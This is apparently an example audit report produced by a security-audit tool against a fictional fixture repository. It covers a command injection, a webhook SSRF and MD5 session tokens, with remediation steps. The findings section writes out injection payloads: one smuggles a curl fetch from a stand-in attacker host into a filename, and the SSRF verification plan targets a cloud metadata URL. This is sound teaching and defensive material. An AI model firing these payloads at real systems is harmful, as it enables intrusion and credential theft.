# Security Report — fixture-repo

> **Example output** for the `security-audit` skill, run against the fictional
> `examples/fixture-repo`. All "vulnerabilities" here are teaching artifacts
> planted in the fixture, not real findings about any project.

- **Audit id:** audit-2026-11-05-example
- **Date:** 2026-11-05
- **Scope:** source code of `examples/fixture-repo`; active testing against a local, isolated instance only
- **Roles:** discovery model A; adversarial validation by independent model B (fresh context)

## Executive summary

3 findings survived validation and dedup: 1 confirmed critical (unauthenticated remote code
execution in the upload path), 1 unverified high (SSRF to cloud metadata via tenant webhooks),
1 hypothesis pending validation (forgeable MD5 session tokens). The confirmed RCE is
production-reachable and warrants immediate remediation under the skill's approval-gated
patch flow.

| Severity | Confirmed | Unverified | Hypothesis | Refuted |
|---|---|---|---|---|
| critical | 1 | 0 | 0 | 0 |
| high | 0 | 1 | 1 | 0 |

## Repository architecture overview

Express-style TypeScript service (`src/`) exposing a public upload endpoint and a Python
webhook fetcher (`src/webhook.py`); session material signed in `lib/session.js`. Trust
boundaries: public HTTP → app (`src/upload.ts:7`), tenant input → server-side fetch
(`src/webhook.py:4`), network → auth material (`lib/session.js:4`). Full inventory in
`.security-audit/architecture.md` and `.security-audit/threat-model.md`.

## Threat model (summary)

Attacker profiles considered: anonymous-remote, authenticated-low-priv, authenticated-neighbor,
malicious-dependency. Selected attack classes, ranked by reachability × impact:
`injection`, `ssrf`, `auth-bypass`, `crypto`, `info-exposure`, `business-logic`,
`dependency-config`. Deployment claims (e.g. "uploads dir is not on a shared host") are
recorded as assumptions in the threat model, not treated as evidence.

## Confirmed vulnerabilities

### SA-command-injection-dcbc2346 — Command injection in thumbnail generation via upload filename

- **Severity / confidence:** critical / high · **Validation:** validated (independent model B)
- **Attacker:** anonymous-remote (any visitor, no credentials)
- **Trust boundary:** network → application (HTTP input executed by the OS shell)
- **Location:** `src/upload.ts:10` in `handleUpload` — `exec(`convert ${dest} ...`)` with `dest`
  derived from `req.query.name` (`src/upload.ts:8–9`)
- **Exploit path:** `GET /upload?name=x;curl${IFS}attacker.example/p.sh` — the interpolated
  string is interpreted by a shell, executing attacker text as a second command.
- **Impact:** unauthenticated RCE with application privileges.
- **Production reachability:** yes — the router exposing `handleUpload` ships in the production
  build (source evidence: route registration in the fixture entry point).

**Reproduction**

1. Start the fixture app locally (authorized test instance only).
2. `curl 'http://127.0.0.1:3000/upload?name=x;id'`
3. `id(1)` output appears in the captured side effects — see
   `.security-audit/pocs/SA-command-injection-dcbc2346/poc.md` for commands and raw output.

**Remediation (proposed patch requires human approval; never auto-applied):**
invoke the converter via an argument-vector API (`execFile("convert", [dest, ...])`) instead of
a shell string, and reject filenames containing separators or metacharacters. Regression test:
`/upload?name=x;id` must not execute `id`. Patch diff in `.security-audit/patches/`.

## Unverified findings

### SA-ssrf-aaa31d02 — Unrestricted outbound request to tenant-supplied webhook URLs

- **Severity / confidence:** high / medium · **Validation:** pending
- **Location:** `src/webhook.py:6` — `urllib.request.urlopen(user_url)` with no scheme/host allowlist.
- **Why unverified:** the audit environment has no running instance of this service; PoC not executed.
- **Missing prerequisites:** isolated deployment with a mock metadata endpoint.
- **Verification plan:** register `url=http://169.254.169.254/latest/meta-data/` on an isolated
  instance, trigger the webhook, inspect the returned body.

### SA-crypto-8e4067e4 — Session tokens signed with unsalted MD5

- **Severity / confidence:** high / low · **Validation:** pending
- **Location:** `lib/session.js:5` — `crypto.createHash("md5")`, unkeyed.
- **Why unverified:** the token *verification* path has not been located yet; until confirmed,
  forgeability is a hypothesis, not a vulnerability claim.

## Coverage limitations

- Covered: `src/` (injection, ssrf), `lib/` (crypto, auth-bypass) — see `findings.json` `coverage`.
- Not audited: dependency versions (`dependency-config` partially investigated), race conditions
  (no concurrency primitives found in fixture), memory safety (no unsafe code).
- Deployment configuration (reverse proxies, network policy) was **assumed**, not evidenced; claims
  depending on it are labeled accordingly.
- Mechanical checks (`validate_findings.py`, `verify_references.py`) passed on this document;
  they verify structure and references only — never exploitability.

## Remediation workflow

For each confirmed finding: minimal patch → regression test that fails pre-patch → apply in an
isolated `git worktree` → test passes → reviewable diff in `.security-audit/patches/`.
Nothing is merged, pushed, or deployed automatically; every patch application requires
explicit human approval.
